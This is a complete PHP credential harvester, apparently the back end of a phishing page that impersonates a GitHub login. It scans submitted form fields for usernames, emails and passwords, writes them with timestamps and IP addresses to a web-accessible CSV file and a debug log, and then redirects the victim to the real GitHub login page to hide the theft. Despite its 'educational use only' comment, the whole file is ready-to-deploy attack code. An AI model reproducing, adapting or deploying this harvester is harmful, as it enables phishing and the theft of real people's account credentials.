<?php
// Universal Form Harvester - Auto-generated
// Author: You
// For educational use only

error_reporting(0);
date_default_timezone_set("UTC");

$csv_path = "/var/www/html/credentials.csv";
$debug_log = "/home/kali/Desktop/My_Scripts/Phishing/Templates/debug_dump.log";

$username = "UNKNOWN";
$password = "UNKNOWN";

// First: Try key-based detection
foreach ($_POST as $key => $value) {
    $lower = strtolower($key);
    $value_trimmed = is_array($value) ? json_encode($value) : trim($value);
    if (preg_match('/\b(user[-_]?name|user[-_]?login|uname|login|email|id|un)\b/i', $lower)) {
        $username = $value_trimmed;
        break;
    }
}

// Fallback: Try value-based email pattern
if ($username === "UNKNOWN") {
    foreach ($_POST as $key => $value) {
        $value_trimmed = is_array($value) ? json_encode($value) : trim($value);
        if (preg_match("/^.+@.+\..+$/", $value_trimmed)) {
            $username = $value_trimmed;
            break;
        }
    }
}

// Password detection
foreach ($_POST as $key => $value) {
    $lower = strtolower($key);
    $value_trimmed = is_array($value) ? json_encode($value) : trim($value);
    if (preg_match('/(pass(word)?|pw|pword)/i', $lower)) {
        $password = $value_trimmed;
        break;
    }
}

$timestamp = date("Y-m-d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$csv_line = "\"$username\",\"$password\",\"$timestamp\",\"$ip\"\n";

file_put_contents($csv_path, $csv_line, FILE_APPEND);
file_put_contents($debug_log, print_r($_POST, true), FILE_APPEND);

header("Location: https://github.com/login");
exit();
?>
